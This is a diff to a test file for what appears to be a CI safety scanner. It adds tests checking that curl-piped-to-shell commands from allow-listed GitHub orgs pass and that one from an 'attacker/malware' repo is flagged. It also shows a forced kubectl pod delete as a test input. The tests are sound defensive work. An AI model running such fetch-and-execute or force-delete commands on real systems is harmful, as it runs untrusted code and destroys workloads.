@@ -62,6 +62,25 @@ describe('mission-safety-scan.mjs scanFileForSafetyIssues (CI observability)', (
     expect(warnings).not.toContain('curl piped to shell from non-standard source — verify URL is official')
   })
 
+  it('does not warn on curl piped to shell from allow-listed raw.githubusercontent.com orgs (#3392)', () => {
+    for (const url of [
+      'curl -fsSL https://raw.githubusercontent.com/wasmcloud/wasmCloud/refs/heads/main/install.sh | bash',
+      'curl -sSf https://raw.githubusercontent.com/WasmEdge/WasmEdge/master/utils/install.sh | bash',
+      'curl -sLS https://raw.githubusercontent.com/kube-burner/kube-burner/refs/heads/main/hack/install.sh | sh',
+    ]) {
+      const { warnings } = scanFileForSafetyIssues('fixes/x.json', url)
+      expect(warnings).not.toContain('curl piped to shell from non-standard source — verify URL is official')
+    }
+  })
+
+  it('warns on curl piped to shell from a non-allow-listed raw.githubusercontent.com repo (#3392)', () => {
+    const { warnings } = scanFileForSafetyIssues(
+      'fixes/x.json',
+      'curl -fsSL https://raw.githubusercontent.com/attacker/malware/main/install.sh | bash',
+    )
+    expect(warnings).toContain('curl piped to shell from non-standard source — verify URL is official')
+  })
+
   it('warns on force delete with grace-period=0 (both overlapping checks fire)', () => {
     const { warnings } = scanFileForSafetyIssues('fixes/x.json', 'kubectl delete pod foo --force --grace-period=0')
     expect(warnings).toContain('Force delete with grace-period=0 — ensure this is intentional')
